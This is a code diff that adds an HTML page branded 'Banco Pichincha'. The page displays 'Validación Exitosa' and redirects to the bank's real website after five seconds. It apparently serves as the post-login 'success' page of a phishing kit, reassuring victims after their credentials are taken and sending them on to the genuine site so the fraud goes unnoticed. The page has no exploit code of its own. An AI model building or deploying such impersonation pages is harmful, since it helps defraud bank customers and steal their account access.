@@ -1,0 +1,45 @@
+<html>
+    <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Banco Pichincha</title>
+
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">
+    <link rel="icon" href="/media/icon.png" type="image/x-icon">
+    <link rel="stylesheet" href="/styles/success.css">
+</head>
+
+<body>
+    <section id="c-container">
+        <div id="c-body">
+
+            <div class="c-logo-container">
+                <img src="/media/charge.gif" class="c-logo" alt="C Logo">
+            </div>
+<br>
+            <h1>¡Validación Exitosa!</h1>
+            <h6>Espera un momento por favor</h6>
+        </div>
+    </section>
+    <script language="JavaScript">
+        var tiempo=5;
+        var url="https://www.pichincha.com/";
+     
+        function updateReloj()
+        {
+     
+            if(tiempo==0)
+            {
+                window.location=url;
+            }else{
+                tiempo-=1;
+                setTimeout("updateReloj()",1000);
+            }
+        }
+       window.onload=updateReloj;
+     
+        </script>
+
+
+</body></html>
